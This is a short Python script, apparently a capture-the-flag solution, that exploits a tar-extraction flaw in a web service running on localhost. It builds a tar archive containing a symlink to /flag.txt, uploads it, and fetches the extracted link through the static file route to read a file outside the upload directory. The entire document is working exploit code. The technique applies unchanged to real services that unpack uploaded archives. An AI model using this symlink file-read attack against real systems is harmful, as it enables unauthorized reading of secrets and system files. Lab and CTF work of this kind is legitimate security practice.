# docker run -it -e URL=http://localhost:3000/ --network=host $(docker build -q ./solution)

import io
import tarfile
import os
import requests
import re

URL = os.environ.get("URL" ,"http://localhost:3000/")

buffer = io.BytesIO()

filename = "xxxx"
with tarfile.TarFile(fileobj=buffer, mode="w") as t:
    info = tarfile.TarInfo(name=filename)
    info.type = tarfile.SYMTYPE
    info.linkname = "/flag.txt"
    t.addfile(info)

tar_bytes = buffer.getvalue()


response = requests.post(f"{URL}upload", files={
    "file": tar_bytes
})

uuid = re.findall(r"Successfully uploaded to ([0-9a-f-]+)", response.text)[0]

response = requests.get(f"{URL}static/{uuid}/{filename}")
print(response.text)